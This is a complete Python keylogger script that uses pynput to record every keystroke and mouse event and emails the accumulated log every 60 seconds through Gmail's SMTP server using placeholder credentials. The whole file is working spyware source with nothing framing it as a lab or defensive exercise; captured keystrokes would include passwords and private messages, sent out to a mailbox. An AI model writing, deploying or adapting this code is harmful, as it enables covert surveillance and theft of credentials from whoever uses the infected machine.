import smtplib
import threading
import socket
import platform
from pynput import keyboard, mouse
from datetime import datetime
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart

EMAIL_ADDRESS = "your_email@example.com"
EMAIL_PASSWORD = "your_app_password"
SEND_REPORT_EVERY = 60  # in seconds

class KeyMouseLogger:
    def __init__(self, interval, email, password):
        self.interval = interval
        self.log = ""
        self.email = email
        self.password = password
        self.start_dt = datetime.now()
        self.end_dt = datetime.now()

    def append_log(self, string):
        self.log += string + "\n"

    # --- Keyboard events ---
    def on_key_press(self, key):
        try:
            key_str = key.char
        except AttributeError:
            key_str = str(key)
        self.append_log(f"[KEY] {key_str}")

    # --- Mouse events ---
    def on_click(self, x, y, button, pressed):
        action = "Pressed" if pressed else "Released"
        self.append_log(f"[MOUSE] {action} {button} at ({x}, {y})")

    def on_scroll(self, x, y, dx, dy):
        self.append_log(f"[MOUSE] Scrolled at ({x}, {y}) by ({dx}, {dy})")

    def on_move(self, x, y):
        self.append_log(f"[MOUSE] Moved to ({x}, {y})")

    def send_mail(self, message):
        msg = MIMEMultipart()
        msg["From"] = self.email
        msg["To"] = self.email
        msg["Subject"] = f"Key & Mouse Logs - {self.start_dt.strftime('%Y-%m-%d %H:%M:%S')}"

        msg.attach(MIMEText(message, "plain"))

        with smtplib.SMTP("smtp.gmail.com", 587) as server:
            server.starttls()
            server.login(self.email, self.password)
            server.send_message(msg)

    def report(self):
        if self.log.strip():
            self.end_dt = datetime.now()
            self.send_mail(self.log)
            self.start_dt = datetime.now()
            self.log = ""
        timer = threading.Timer(self.interval, self.report)
        timer.daemon = True
        timer.start()

    def run(self):
        # Start mouse listener in a separate thread
        mouse_listener = mouse.Listener(
            on_click=self.on_click,
            on_scroll=self.on_scroll,
            on_move=self.on_move
        )
        mouse_listener.start()

        # Start keyboard listener
        keyboard_listener = keyboard.Listener(on_press=self.on_key_press)
        keyboard_listener.start()

        # Start periodic email report
        self.report()

        # Join threads to keep them running
        keyboard_listener.join()
        mouse_listener.join()

if __name__ == "__main__":
    logger = KeyMouseLogger(SEND_REPORT_EVERY, EMAIL_ADDRESS, EMAIL_PASSWORD)
    logger.run()
